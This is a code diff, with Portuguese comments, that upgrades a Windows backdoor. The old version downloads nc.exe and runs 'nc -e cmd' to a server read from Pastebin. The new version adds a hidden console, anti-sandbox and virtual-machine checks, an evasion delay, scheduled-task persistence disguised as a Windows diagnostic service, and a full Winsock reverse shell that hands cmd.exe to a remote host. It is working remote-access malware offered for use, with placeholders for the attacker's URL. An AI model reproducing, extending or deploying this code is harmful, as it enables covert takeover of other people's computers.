@@ -1,71 +1,97 @@
-#include <iostream>
-#include "include/regv.h"
+#include <winsock2.h>    // OBRIGATÓRIO SER O PRIMEIRO
+#include <ws2tcpip.h>
 #include <windows.h>
-#include <dirent.h>
-#include "include/behaviour.h"
+#include <iostream>
+#include <string>
+#include <vector>
 
-using namespace std;
+#pragma comment(lib, "ws2_32.lib")
 
-int main(void){
-    // Hide windows console
-    ShowWindow(GetConsoleWindow(),SW_HIDE);
-// --------------------------------------------------------------------------------------------
-/* Uncomment to enable persistent mod
-   
-    //Get current location
-    char* cwd = _getcwd( 0, 0 );
-    string directory (cwd);
-    free(cwd);
-    replace( directory.begin(), directory.end(), '\\', '/');
-    //Filename of your executable
-    cout << directory << endl;
-    string directory_file = (directory+"/main.exe");
-    cout << directory_file << endl;
-    //Copy your executable to "C:/Program Files/Windows NT/main.exe" for autostart on boot
-    CopyFile(directory_file.c_str(), "C:/Program Files/Windows NT/main.exe", FALSE);
-    //Write on reg for program autostart
-    RegWrite(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "main",REG_SZ, "C:/Program Files/Windows NT/main.exe");
+// Nossos módulos customizados
+#include "Obfuscator.hpp"
+#include "AntiSandbox.hpp"
+#include "DownloadManager.hpp"
+#include "PersistenceManager.hpp"
 
-*/// Uncomment to enable persistent mode
+// Protótipo da função (Avisa o compilador que ela existe lá embaixo)
+void ExecuteReverseShell(const std::string& ip, int port);
 
+int main() {
+    // --- 1. OCULTAÇÃO DA INTERFACE ---
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
 
-    while (true){
-// --------------------------------------------------------------------------------------------
-        // Raw of pastebin with server and port
-        string url = "https://pastebin.com/raw/*****"; // -< YOUR URL
-        //Location where txt file will be downloaded
-        string path = "C:/Windows/Temp/text.txt";
-        //Command powershell v2
-        string cmd = ("powershell (New-Object Net.WebClient).DownloadFile( '"+url+"', '"+path+"')");
-        system(cmd.c_str());
-
-// --------------------------------------------------------------------------------------------
-        //Oppening file downloaded
-        ifstream txt(path);
-        //string who will get content of file
-        string line_one;
-        string line_two;
-        //getting content from file
-        getline(txt, line_one);
-        getline(txt, line_two);
-
-// --------------------------------------------------------------------------------------------
-        //Array for split the text
-        std::vector<std::string> ServnPort;
-        //splitting the text where had '|'
-        ServnPort=split(line_one,"|");
-        //String for server
-        string server = ServnPort[0];
-        //String for port
-        string port = ServnPort[1];
-        //comand to give cmd to ngrok server, and port
-        string cmd_two = ("C:/Windows/Temp/nc.exe -e cmd "+server+" "+port);
-        string cmd_one = ("powershell (New-Object Net.WebClient).DownloadFile( '"+line_two+"', 'C:/Windows/Temp/nc.exe')");
-        system(cmd_one.c_str());
-        system(cmd_two.c_str());
-
-        //Try re-connection every 3 minutes
-        Sleep(180000);
+    // --- 2. DEFESA ATIVA (ANTI-ANALYSIS) ---
+    // Se for testar em um ambiente controlado, comente essa parte para evitar falsos positivos
+    if (AntiSandbox::IsLowResources() || AntiSandbox::IsSingleCore() || AntiSandbox::IsVirtualMachine()) {
+        return 0; 
     }
-// --------------------------------------------------------------------------------------------
+
+    // --- 3. EVASÃO POR TEMPO (HEAVY DELAY) ---
+    AntiSandbox::ExecuteHeavyDelay(120000000); 
+
+    // --- 4. PERSISTÊNCIA (TASK SCHEDULER) ---
+    wchar_t szPath[MAX_PATH];
+    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    PersistenceManager::CreateLogonTask(L"WinNetDiagnosticService", szPath);
+
+    // --- 5. COMUNICAÇÃO C2 (MEMORY-ONLY) ---
+    DownloadManager dl;
+    std::string rawCommand = dl.FetchRemoteCommand(PROTECT("https://pastebin.com/raw/YOUR-PASTEVIN-ID")); // Substitua pelo seu URL real
+
+    if (!rawCommand.empty()) {
+        // --- 6. PARSING DO COMANDO ---
+        size_t delimiterPos = rawCommand.find('|');
+        if (delimiterPos != std::string::npos) {
+            std::string ip = rawCommand.substr(0, delimiterPos);
+            int port = std::stoi(rawCommand.substr(delimiterPos + 1));
+
+            // --- 7. PAYLOAD FINAL (REVERSE SHELL) ---
+            ExecuteReverseShell(ip, port); // Passando a string diretamente
+        }
+    }
+    return 0;
+}
+
+// Implementação da função usando API moderna e segura
+void ExecuteReverseShell(const std::string& ip, int port) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
+
+    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (s == INVALID_SOCKET) {
+        WSACleanup();
+        return;
+    }
+
+    sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(static_cast<unsigned short>(port));
+    
+    // Uso correto do inet_pton
+    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) <= 0) {
+        closesocket(s);
+        WSACleanup();
+        return;
+    }
+
+    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
+        closesocket(s);
+        WSACleanup();
+        return;
+    }
+
+    STARTUPINFOA sinfo;
+    PROCESS_INFORMATION pinfo;
+    SecureZeroMemory(&sinfo, sizeof(sinfo));
+    sinfo.cb = sizeof(sinfo);
+    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s;
+    sinfo.wShowWindow = SW_HIDE;
+
+    char cmdPath[] = "cmd.exe";
+    if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) {
+        CloseHandle(pinfo.hProcess);
+        CloseHandle(pinfo.hThread);
+    }
 }
